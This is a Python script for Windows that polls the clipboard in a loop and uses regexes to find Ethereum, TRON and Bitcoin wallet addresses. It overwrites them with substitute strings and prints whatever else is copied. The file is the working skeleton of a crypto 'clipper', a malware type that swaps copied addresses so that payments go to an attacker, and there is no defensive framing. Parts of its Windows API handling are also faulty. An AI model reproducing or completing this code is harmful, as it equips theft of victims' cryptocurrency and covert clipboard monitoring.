import ctypes
import re
import time

class Clipboard:
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.user32 = ctypes.windll.user32
        self.kernel32.GlobalAlloc.argtypes = [ctypes.c_int, ctypes.c_size_t]
        self.kernel32.GlobalAlloc.restype = ctypes.c_void_p
        self.kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
        self.kernel32.GlobalLock.restype = ctypes.c_void_p
        self.kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
        self.kernel32.GlobalFree.argtypes = [ctypes.c_void_p]
        self.user32.GetClipboardData.restype = ctypes.c_void_p
        self.user32.SetClipboardData.argtypes = [ctypes.c_uint, ctypes.c_void_p]
        self.user32.EmptyClipboard()
    
    def __enter__(self):
        self.user32.OpenClipboard(0)
        if self.user32.IsClipboardFormatAvailable(1):
            data = self.user32.GetClipboardData(1)
            if data:
                data_locked = self.kernel32.GlobalLock(data)
                if data_locked:
                    text = ctypes.c_char_p(data_locked).value
                    self.kernel32.GlobalUnlock(data_locked)
                    if text:
                        try:
                            return text.decode()
                        except Exception as e:
                            print("Error decoding clipboard data:", e)
        return ''
    
    def __exit__(self, exc_type, exc_value, exc_traceback):
        self.user32.CloseClipboard()

    def set_clipboard_text(self, text):
        """Set the clipboard text."""
        self.user32.EmptyClipboard()
        h_global_mem = self.kernel32.GlobalAlloc(0x0002, ctypes.sizeof(ctypes.c_char * (len(text) + 1)))
        lock_mem = self.kernel32.GlobalLock(h_global_mem)
        ctypes.memmove(lock_mem, text.encode(), len(text) + 1)
        self.kernel32.GlobalUnlock(h_global_mem)
        self.user32.SetClipboardData(1, h_global_mem)
        self.user32.CloseClipboard()
        self.kernel32.GlobalFree(h_global_mem)

def replace_wallet_addresses(text):
    # Order and specificity of regex is crucial
    eth_pattern = r'\b0x[a-fA-F0-9]{40}\b'  # Ethereum addresses
    trc20_pattern = r'\bT[A-Za-z0-9]{33}\b'  # TRC-20 addresses on TRON
    btc_pattern = r'\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}\b'  # Bitcoin addresses
    
    text = re.sub(eth_pattern, "DetectedETH", text)
    text = re.sub(trc20_pattern, "DetectedTRC20", text)
    text = re.sub(btc_pattern, "DetectedBTC", text)  # Applied last to avoid overlap
    return text

# Monitor clipboard for changes
clipboard_monitor = Clipboard()
last_clipboard_content = None
while True:
    with clipboard_monitor as clipboard_content:
        if clipboard_content != last_clipboard_content:
            last_clipboard_content = clipboard_content
            if clipboard_content:
                modified_text = replace_wallet_addresses(clipboard_content)
                if modified_text != clipboard_content:
                    clipboard_monitor.set_clipboard_text(modified_text)
                    print("Detected and updated crypto wallet in the clipboard content.")
                else:
                    print("Clipboard contains:", clipboard_content)
    time.sleep(0.1)  # Reduce the frequency of checks to ease CPU usage